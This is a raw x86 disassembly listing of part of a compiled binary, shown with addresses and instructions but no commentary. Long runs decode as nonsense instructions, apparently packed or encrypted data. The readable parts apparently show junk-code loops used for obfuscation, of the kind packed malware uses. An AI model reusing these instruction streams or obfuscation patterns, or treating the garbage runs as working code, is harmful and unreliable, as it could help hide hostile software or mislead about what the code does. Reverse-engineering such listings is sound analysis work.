  4030d2:	mov    ebx,DWORD PTR [ecx-0x13]
  4030d5:	mov    dh,0xf6
  4030d7:	sub    ebx,DWORD PTR [eax]
  4030d9:	call   DWORD PTR [ebx]
  4030db:	xchg   ebp,eax
  4030dc:	inc    esi
  4030dd:	adc    ah,ch
  4030df:	pop    eax
  4030e0:	sbb    BYTE PTR [esi-0xd],dl
  4030e3:	js     0x4030d6
  4030e5:	inc    ecx
  4030e6:	jmp    0xe1e862e0
  4030eb:	nop
  4030ec:	sub    ebx,esi
  4030ee:	mov    eax,0x9b4f7216
  4030f3:	mov    cl,0x5e
  4030f5:	pop    ss
  4030f6:	push   0x51857d4
  4030fb:	clc    
  4030fc:	rol    edx,1
  4030fe:	mov    ch,0xf4
  403100:	and    DWORD PTR [edi],ecx
  403102:	jne    0x403160
  403104:	mov    esi,0xce54700b
  403109:	sbb    eax,0x1c36d33e
  40310e:	aam    0xd5
  403110:	iret   
  403111:	or     BYTE PTR [edx],dl
  403113:	dec    ebx
  403114:	fsub   st(1),st
  403116:	inc    esi
  403117:	(bad)  
  403118:	loop   0x403132
  40311a:	and    ch,bl
  40311c:	mov    ebp,0xaaee5f54
  403121:	xchg   ebx,eax
  403122:	test   al,0xde
  403124:	jnp    0x4030eb
  403126:	scas   eax,DWORD PTR es:[edi]
  403127:	out    dx,eax
  403128:	sbb    eax,0xb08e6ebf
  40312d:	push   ebx
  40312e:	xlat   BYTE PTR ds:[ebx]
  40312f:	in     al,0xbc
  403131:	iret   
  403132:	cli    
  403133:	xchg   ecx,eax
  403134:	gs push esp
  403136:	pop    ebp
  403137:	push   ds
  403138:	cmp    esp,DWORD PTR [esi+ebp*8-0x1af0052]
  40313f:	mov    eax,DWORD PTR [ebp-0x38]
  403142:	mov    ecx,DWORD PTR ds:0x413bb0
  403148:	add    DWORD PTR [eax],ecx
  40314a:	pop    edi
  40314b:	jmp    0x4032ec
  403150:	add    dl,BYTE PTR [ecx]
  403152:	mov    BYTE PTR [ebx-0x4ede4c77],ch
  403158:	adc    BYTE PTR [edx+0x1abac15c],0x1d
  40315f:	(bad)  
  403160:	mov    edx,0xfa7e7e17
  403165:	jg     0x4031e5
  403167:	jle    0x40317c
  403169:	aad    0xa4
  40316b:	sahf   
  40316c:	ins    DWORD PTR es:[edi],dx
  40316d:	add    DWORD PTR [edi-0x14],eax
  403170:	arpl   bp,sp
  403172:	jge    0x4031c3
  403174:	and    edx,0x38
  403177:	mov    bl,0x2e
  403179:	xchg   edi,eax
  40317a:	pop    edi
  40317b:	push   esi
  40317c:	add    eax,0xe8edad73
  403181:	rol    BYTE PTR [edx],1
  403183:	xor    eax,0x4ed7c780
  403188:	(bad)  
  403189:	rcl    DWORD PTR [ecx+edi*2],1
  40318c:	retf   0x570e
  40318f:	ja     0x403195
  403191:	lods   eax,DWORD PTR ds:[esi]
  403192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403194:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403195:	xchg   esp,eax
  403196:	adc    bh,BYTE PTR [ecx+0x1f22313b]
  40319c:	retf   0x4db0
  40319f:	xchg   ebp,eax
  4031a0:	pop    edi
  4031a1:	add    al,BYTE PTR [eax]
  4031a3:	mov    al,0xac
  4031a5:	rcr    BYTE PTR [edi+0x62],0x7d
  4031a9:	rcr    BYTE PTR [eax-0x55],0x7b
  4031ad:	call   0x6455:0xed363979
  4031b4:	mov    edi,0x995f30fe
  4031b9:	data16 fcmovne st,st(4)
  4031bc:	stos   DWORD PTR es:[edi],eax
  4031bd:	into   
  4031be:	js     0x403149
  4031c0:	test   al,0x6e
  4031c2:	push   ss
  4031c3:	push   ecx
  4031c4:	iret   
  4031c5:	cmp    DWORD PTR [edi],eax
  4031c7:	sbb    eax,0x6c93a4bc
  4031cc:	mov    DWORD PTR [esi],eax
  4031ce:	cmp    al,BYTE PTR [eax+eax*4]
  4031d1:	mov    dh,0x4d
  4031d3:	dec    BYTE PTR [edi]
  4031d5:	sub    cl,bl
  4031d7:	into   
  4031d8:	rcl    BYTE PTR [esi-0x3e],cl
  4031db:	fdivr  st(7),st
  4031dd:	test   eax,0x3ceb6c32
  4031e2:	mov    edx,0xa11df525
  4031e7:	xchg   ebp,eax
  4031e8:	push   esi
  4031e9:	sbb    bh,dh
  4031eb:	mov    esp,0xd31b8a86
  4031f0:	xchg   BYTE PTR [eax+0x168c7b62],ah
  4031f6:	fidivr DWORD PTR [ebx+edx*2]
  4031f9:	(bad)  
  4031fb:	int    0xf4
  4031fd:	je     0x40327c
  4031ff:	inc    eax
  403200:	pop    ebp
  403201:	jg     0x40325d
  403203:	aam    0xa
  403205:	aas    
  403206:	or     DWORD PTR [esi-0x38833096],ecx
  40320c:	adc    BYTE PTR [edx],dh
  40320e:	jl     0x4031ea
  403210:	fdivrp st(4),st
  403212:	data16 add dh,BYTE PTR [ebx]
  403215:	outs   dx,DWORD PTR ds:[esi]
  403216:	mov    WORD PTR [esi-0x18852e41],cs
  40321c:	and    DWORD PTR [esi+edx*4],esi
  40321f:	lea    esp,ds:0xe38e1a45
  403225:	mov    cl,0x3b
  403227:	jmp    0x7566:0x9f4bc1dc
  40322e:	dec    eax
  40322f:	fadd   DWORD PTR [edx]
  403231:	push   0xffffff82
  403233:	lods   al,BYTE PTR ds:[esi]
  403234:	pop    edi
  403235:	xchg   edi,eax
  403236:	lds    edx,FWORD PTR [edx]
  403238:	int3   
  403239:	retf   0x45fc
  40323c:	pop    ss
  40323d:	pusha  
  40323e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40323f:	mov    esi,0xf291530a
  403244:	daa    
  403245:	(bad)  
  403246:	fcom   DWORD PTR ds:0x4d0f0231
  40324c:	xor    al,0xa3
  40324e:	dec    esp
  40324f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403250:	in     al,0x75
  403252:	cmp    DWORD PTR [eax-0x3],ebp
  403255:	add    BYTE PTR ds:0x87ad50c9,ah
  40325b:	xchg   esp,eax
  40325c:	jle    0x40327b
  40325e:	ret    
  40325f:	dec    ebx
  403260:	aas    
  403261:	fwait
  403262:	div    dl
  403264:	movlps QWORD PTR [ebx-0x6d61fff5],xmm7
  40326b:	std    
  40326c:	lea    ebx,[eax+eiz*2]
  40326f:	or     DWORD PTR [edx+esi*8-0x64],edx
  403273:	pmaxsw mm2,QWORD PTR [ecx]
  403276:	out    0xcc,eax
  403278:	mov    ds:0x96943fec,eax
  40327d:	lahf   
  40327e:	cvttps2pi mm5,QWORD PTR ds:0x40e00187
  403285:	das    
  403286:	test   al,0xab
  403288:	lods   al,BYTE PTR ds:[esi]
  403289:	nop
  40328a:	inc    edx
  40328b:	pop    eax
  40328c:	dec    edi
  40328d:	fadd   DWORD PTR [ebx-0x56]
  403290:	neg    BYTE PTR [ebx]
  403292:	imul   ebx,DWORD PTR ds:0xc8f3bc98,0xffffffaa
  403299:	loop   0x4032af
  40329b:	outs   dx,BYTE PTR ds:[esi]
  40329c:	xchg   esp,eax
  40329d:	scas   eax,DWORD PTR es:[edi]
  40329e:	(bad)  
  4032a0:	iret   
  4032a1:	mov    ebp,0x256e59aa
  4032a6:	outs   dx,DWORD PTR ds:[esi]
  4032a7:	cmp    BYTE PTR [eax+0x63],cl
  4032aa:	inc    ecx
  4032ab:	cmc    
  4032ac:	pop    esp
  4032ad:	sbb    BYTE PTR [edx],ch
  4032af:	imul   ebx,DWORD PTR [edx-0x799313dc],0x52d7554c
  4032b9:	push   eax
  4032ba:	jg     0x403280
  4032bc:	imul   ebx,edi,0x23
  4032bf:	jno    0x4032f0
  4032c1:	jno    0x403251
  4032c3:	xor    eax,0x2cf72ea
  4032c8:	mov    ah,0xa2
  4032ca:	scas   al,BYTE PTR es:[edi]
  4032cb:	dec    edi
  4032cc:	sub    eax,0x2deebf0f
  4032d1:	jbe    0x403265
  4032d3:	(bad)  
  4032d4:	push   esp
  4032d5:	add    BYTE PTR [ecx+0x162d8fe9],bl
  4032db:	pop    edx
  4032dc:	loopne 0x4032e2
  4032de:	inc    eax
  4032df:	out    0x56,al
  4032e1:	jl     0x403320
  4032e3:	adc    ebp,esp
  4032e5:	push   ecx
  4032e6:	nop
  4032e7:	dec    ecx
  4032e8:	jb     0x4032ea
  4032ea:	inc    eax
  4032eb:	mov    esp,0xc3c95b5e
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x43375b,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x43375b
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x43375b,ecx
  40331d:	cmp    DWORD PTR ds:0x43375b,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x43375b,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x4337ef,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x4337d7,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43371f
  40336b:	add    DWORD PTR ds:0x433703,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x433757,0x1e
  40338b:	cmp    DWORD PTR ds:0x433757,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x433757,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x433757,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x433757
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x433757,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x433757
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x433757,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x4337e7
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x433747
  4033f2:	mov    edi,DWORD PTR ds:0x433787
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x433767,0x1c
  40340f:	cmp    DWORD PTR ds:0x433767,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x433767,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x433767,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x433767
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x433767,edi
  40344c:	mov    edi,DWORD PTR ds:0x433767
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x433767,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x4337e3
  403467:	and    edx,DWORD PTR ds:0x433817
  40346d:	mov    DWORD PTR ds:0x4337e3,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43379b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43381f
  40349f:	adc    DWORD PTR ds:0x4336ff,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433817,0x10
  4034c6:	cmp    DWORD PTR ds:0x433817,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433817,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433817,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433817
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433817,edi
  403505:	mov    edi,DWORD PTR ds:0x433817
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433817,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x43382b,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp-0x74fd2b76]
  403537:	xor    dl,BYTE PTR [edx+0x7e7e15c6]
  40353d:	pop    eax
  40353e:	jl     0x4035be
  403540:	jle    0x40355c
  403542:	push   edx
  403543:	pop    ebp
  403544:	xchg   esp,eax
  403545:	(bad)  
  403546:	das    
  403547:	push   edi
  403548:	outs   dx,BYTE PTR ss:[esi]
  40354a:	stos   DWORD PTR es:[edi],eax
  40354b:	(bad)  
  40354c:	fist   DWORD PTR [ebx-0x1d]
  40354f:	sbb    eax,DWORD PTR [edi+0x25]
  403552:	xor    eax,0xd4f74f95
  403557:	aas    
  403558:	fild   WORD PTR [ecx+0x38bcf548]
  40355e:	loop   0x403538
  403560:	sti    
  403561:	mov    ss,ebp
  403563:	pushf  
  403564:	dec    ecx
  403565:	retf   
  403566:	test   BYTE PTR [ebx-0x745c8996],0x6d
  40356d:	inc    esi
  40356e:	mov    dh,0xcb
  403570:	xor    ecx,ebx
  403572:	lds    edi,FWORD PTR [ecx+esi*8]
  403575:	xchg   esp,eax
  403576:	xchg   ebx,eax
  403577:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403578:	shl    BYTE PTR [ebp+0x69],0x92
  40357c:	or     DWORD PTR [edi],ebp
  40357e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40357f:	pop    esp
  403580:	or     BYTE PTR [ebp-0x4ae6f96d],dh
  403586:	xchg   edx,eax
  403587:	mov    ch,0xec
  403589:	cmp    BYTE PTR [ebp+0x5cd2ef6f],0xc4
  403590:	aaa    
  403591:	fisttp WORD PTR [eax]
  403593:	mov    esi,0x350b5ea
  403598:	xchg   edi,eax
  403599:	clc    
  40359a:	jecxz  0x40355b
  40359c:	mov    ebx,0x962623a6
  4035a1:	sbb    DWORD PTR ds:0x9ea5511a,0xffffffa4
  4035a8:	sub    eax,0x6d1b9a8c
  4035ad:	sub    BYTE PTR [ebx+0x5],al
  4035b0:	or     ah,BYTE PTR [eax+0x4c]
  4035b3:	mov    al,ds:0x1f814038
  4035b8:	(bad)  
  4035b9:	in     eax,0xb
  4035bb:	outs   dx,BYTE PTR ds:[esi]
  4035bc:	dec    esi
  4035bd:	jbe    0x40361e
  4035bf:	adc    eax,0x1d85f900
  4035c4:	cmp    dh,BYTE PTR [ebp+0x38]
  4035c7:	test   al,0xa8
  4035c9:	scas   al,BYTE PTR es:[edi]
  4035ca:	in     eax,0x8c
  4035cc:	lds    eax,FWORD PTR [eax+0x70]
  4035cf:	cmp    cl,BYTE PTR [ebx-0xd]
  4035d2:	jecxz  0x4035a0
  4035d4:	cs mov ds,esi
  4035d7:	or     al,0x38
  4035d9:	sbb    dl,BYTE PTR [ebx-0x2]
  4035dc:	xchg   ebx,eax
  4035dd:	jp     0x4035af
  4035df:	xchg   edi,eax
  4035e0:	fild   DWORD PTR [edx-0x414101b0]
  4035e6:	sub    eax,0xc5410466
  4035eb:	das    
  4035ec:	aaa    
  4035ed:	cld    
  4035ee:	or     bl,ch
  4035f0:	out    dx,al
  4035f1:	pushf  
  4035f2:	add    DWORD PTR [ecx+0x7b13b3f6],edi
  4035f8:	jecxz  0x4035a8
  4035fa:	push   es
  4035fb:	shl    DWORD PTR [edi+ecx*8-0x621a3423],cl
  403602:	(bad)  
  403603:	cmp    al,0x71
  403605:	ror    DWORD PTR [edx-0x43],0x4
  403609:	sar    DWORD PTR [eax-0x53],0x33
  40360d:	add    al,0xaa
  40360f:	xor    edx,ebx
  403611:	retf   
  403612:	loopne 0x403594
  403614:	rol    BYTE PTR [ebx+ebx*4],cl
  403617:	cli    
  403618:	and    al,0x5d
  40361a:	stos   DWORD PTR es:[edi],eax
  40361b:	ja     0x4035a9
  40361d:	sbb    DWORD PTR [ebx+0x69],esi
  403620:	mov    ds:0x839325c3,eax
  403625:	sbb    al,0x38
  403627:	and    dh,BYTE PTR [ecx-0x18]
  40362a:	push   0x84bfc96f
  40362f:	xor    DWORD PTR [eax+0x34],esi
  403632:	mov    BYTE PTR [edx],bl
  403634:	pushf  
  403635:	shl    BYTE PTR [edx],1
  403637:	and    al,0x5b
  403639:	mov    ecx,0xd8c01b39
  40363e:	sbb    ax,0x875b
  403642:	test   BYTE PTR [eax],dl
  403644:	gs adc edx,edi
  403647:	jge    0xccffcc5
  40364d:	push   ebx
  40364e:	mov    dh,0x71
  403650:	sub    DWORD PTR [eax-0x5],ecx
  403653:	loope  0x40360e
  403655:	xor    DWORD PTR [ebp-0x4e],ecx
  403658:	mov    cl,0x88
  40365a:	dec    DWORD PTR [ebp-0x11]
  40365d:	arpl   WORD PTR [ebx],cx
  40365f:	adc    eax,0xdbd55fba
  403664:	push   esp
  403665:	mov    ebp,0x4edcad7b
  40366a:	mov    bh,0xbc
  40366c:	and    bh,BYTE PTR [eax-0x73a78150]
  403672:	imul   edx,DWORD PTR [ebp-0x10],0x7fd48ef7
  403679:	repnz push es
  40367b:	or     eax,0x54212c13
  403680:	add    ch,dh
  403682:	xor    DWORD PTR [ebp+0x3],esp
  403685:	sub    al,0xcd
  403687:	iret   
  403688:	popf   
  403689:	cmp    al,bh
  40368b:	arpl   WORD PTR [esi+edi*1+0x1bde0fca],cx
  403692:	ficom  WORD PTR [ebx+0x3dc42e65]
  403698:	add    edx,ebp
  40369a:	inc    ebp
  40369b:	or     eax,ebp
  40369d:	jns    0x4036e2
  40369f:	push   ebp
  4036a0:	mov    dl,0x2c
  4036a2:	xchg   esi,eax
  4036a3:	adc    esi,DWORD PTR [esi]
  4036a5:	imul   ebx,DWORD PTR [ecx-0x37],0x22
  4036a9:	ficom  DWORD PTR [ebx+0x57]
  4036ac:	mov    BYTE PTR [ecx+ebx*8+0x52],cl
  4036b0:	jbe    0x4036c4
  4036b2:	aad    0x75
  4036b4:	pop    esi
  4036b5:	out    0xa0,eax
  4036b7:	in     eax,dx
  4036b8:	adc    al,BYTE PTR [edx+ebp*4-0x2a]
  4036bc:	xchg   ebp,eax
  4036bd:	ja     0x403669
  4036bf:	cmp    esp,0x2a155a64
  4036c5:	inc    esp
  4036c6:	enter  0x9797,0x89
  4036ca:	es cmc 
  4036cc:	jmp    0x403719
  4036ce:	jb     0x4036fe
  4036d0:	mov    esi,DWORD PTR [eax+0x47]
  4036d3:	sbb    eax,0x507f3917
  4036d8:	cmp    al,0xf6
  4036da:	xchg   ebp,eax
  4036db:	pop    ebx
  4036dc:	dec    esp
  4036dd:	pop    edx
  4036de:	dec    ebp
  4036df:	cmp    al,BYTE PTR [eax-0x66d1b649]
  4036e5:	push   esp
  4036e6:	mov    al,0x53
  4036e8:	inc    eax
  4036e9:	jb     0x4036df
  4036eb:	mov    eax,0x3b6ee52c
  4036f0:	fisubr WORD PTR [ebx]
  4036f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036f3:	test   al,bh
  4036f5:	shl    DWORD PTR [ebx-0x2a],0x83
  4036f9:	cmp    eax,0x72fce637
  4036fe:	dec    ebp
  4036ff:	xor    dh,dh
  403701:	xor    ah,bh
  403703:	xchg   esp,eax
  403704:	adc    edi,DWORD PTR [ebp+ebx*8+0x2b01327c]
  40370b:	dec    edi
  40370c:	pop    ds
  40370d:	jae    0x40373e
  40370f:	out    0x79,al
  403711:	mov    ds:0x5a243c6,al
  403716:	mov    ecx,0xedd7fc8e
  40371b:	add    BYTE PTR [edi-0x1c],ch
  40371e:	sti    
  40371f:	mov    BYTE PTR [edx+0x3f0fe09d],ah
  403725:	ss push 0x53d0c833
  40372b:	xchg   esp,eax
  40372c:	jne    0x40370d
  40372e:	jl     0x4037a4
  403730:	mov    al,0x25
  403732:	cli    
  403733:	into   
  403734:	mov    eax,0x59f83ba9
  403739:	(bad)  
  40373a:	adc    al,0xca
  40373c:	es sub al,0xad
  40373f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403740:	out    0xb9,al
  403742:	mov    ah,0x60
  403744:	in     eax,0x9f
  403746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403747:	add    eax,0xf321559b
  40374c:	mov    edx,0xabc48386
  403751:	push   cs
  403752:	xor    dh,BYTE PTR [edi-0x3b5b94aa]
  403758:	xchg   edi,eax
  403759:	xchg   BYTE PTR [esi],dh
  40375b:	ja     0x4036f0
  40375d:	and    DWORD PTR [eax],ecx
  40375f:	or     DWORD PTR [esi-0x2263dfa2],0x9319d9ac
  403769:	not    DWORD PTR [eax]
  40376b:	rcl    BYTE PTR [edx-0x32],1
  40376e:	(bad)  
  40376f:	push   eax
  403770:	(bad)  
  403772:	pop    esi
  403773:	pop    edx
  403774:	jg     0x403785
  403776:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403777:	js     0x403701
  403779:	pop    ecx
  40377a:	add    DWORD PTR ds:0xa70beaef,eax
  403780:	stos   BYTE PTR es:[edi],al
  403781:	inc    esp
  403782:	pop    edx
  403783:	retf   0x4cf8
  403786:	ret    
  403787:	xchg   ebx,eax
  403788:	and    eax,DWORD PTR [ebx+0x4f]
  40378b:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40378d:	bound  edx,QWORD PTR [ebx+0x6e7a07fb]
  403793:	push   ecx
  403794:	pop    eax
  403795:	add    BYTE PTR [edi+esi*2],dh
  403798:	mov    cl,0x8d
  40379a:	jmp    0xff00:0x3e1144bc
  4037a1:	adc    edx,ebp
  4037a3:	inc    ebx
  4037a4:	pushf  
  4037a5:	mov    bl,0xe3
  4037a7:	in     eax,dx
  4037a8:	and    al,0xa7
  4037aa:	imul   ebp,DWORD PTR [edx+0x1b],0xffffffda
  4037ae:	push   ebx
  4037af:	or     BYTE PTR [edi],al
  4037b1:	test   esp,esp
  4037b3:	fs stos DWORD PTR es:[edi],eax
  4037b5:	push   cs
  4037b6:	mov    ah,BYTE PTR [esi]
  4037b8:	retf   0xfae0
  4037bb:	push   es
  4037bc:	or     ch,BYTE PTR [bp+si+0x6248]
  4037c1:	into   
  4037c2:	retf   0x6851
  4037c5:	or     BYTE PTR [ecx+edi*8],dl
  4037c8:	push   eax
  4037c9:	mov    eax,0xc70a76ba
  4037ce:	xchg   DWORD PTR [bp+di+0x3d],esp
  4037d2:	sub    bl,BYTE PTR [esp+eiz*4-0x21c81aff]
  4037d9:	ja     0x4037f5
  4037db:	scas   eax,DWORD PTR es:[edi]
  4037dc:	cmc    
  4037dd:	inc    ecx
  4037de:	sbb    BYTE PTR [esi-0x6ec84718],0xbe
  4037e5:	jns    0x403838
  4037e7:	and    ah,BYTE PTR [eax]
  4037e9:	cdq    
  4037ea:	mov    edx,DWORD PTR [ebx+0x130cddfc]
  4037f0:	dec    ebx
  4037f1:	pop    esi
  4037f2:	sub    esi,edi
  4037f4:	mov    ebp,0xd6916bc1
  4037f9:	add    eax,DWORD PTR [ebx+0x3ee839d8]
  4037ff:	cmp    al,0x71
  403801:	test   DWORD PTR [edx+0x71f02528],0x2de7c2a5
  40380b:	in     al,0x16
  40380d:	mov    esi,0x1ffc70b0
  403812:	loopne 0x403880
  403814:	fidivr WORD PTR [edi-0x3f701aa9]
  40381a:	push   edi
  40381b:	icebp  
  40381c:	sub    eax,0x96364b9
  403821:	push   ebx
  403822:	retf   0x2032
  403825:	lock or eax,edi
  403828:	inc    ebp
  403829:	les    edi,FWORD PTR [eax]
  40382b:	test   DWORD PTR [eax+edi*8+0x36fb3d1b],ebx
  403832:	inc    ebx
  403833:	add    BYTE PTR [ebx+0x3d1b0855],cl
  403839:	stos   DWORD PTR es:[edi],eax
  40383a:	aaa    
  40383b:	inc    ebx
  40383c:	add    BYTE PTR [ebx],dh
  40383e:	rol    BYTE PTR [ecx+0x43382725],1
  403844:	add    BYTE PTR [eax],al
  403846:	add    BYTE PTR [eax],al
  403848:	add    BYTE PTR [ebx],dh
  40384a:	inc    DWORD PTR [ebx]
  40384c:	cmp    eax,0x433827
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x433827,edi
  403858:	cmp    DWORD PTR ds:0x433827,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x433827,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x433827
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x433827,edi
  40389c:	cmp    DWORD PTR ds:0x433827,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x43376b,0x43382b
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433793,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x4337eb,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x433827,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x4337eb,0x4337ab
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x4336fb,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433717,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433713,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43381b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x4336ff,0x1d
  403935:	cmp    DWORD PTR ds:0x4336ff,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x4336ff,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x4336ff,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x4336ff
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x4336ff,ebx
  403985:	mov    ebx,DWORD PTR ds:0x4336ff
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x4336ff,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x433767
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433713
  4039a6:	sub    edi,DWORD PTR ds:0x433823
  4039ac:	mov    DWORD PTR ds:0x433713,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433707,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433707,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433707,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433707
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433707,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433717
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x4336fb,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x4336fb
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x4336fb,ebx
  403a19:	cmp    DWORD PTR ds:0x4336fb,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x4336fb,0x1e
  403a38:	jb     0x403a0a
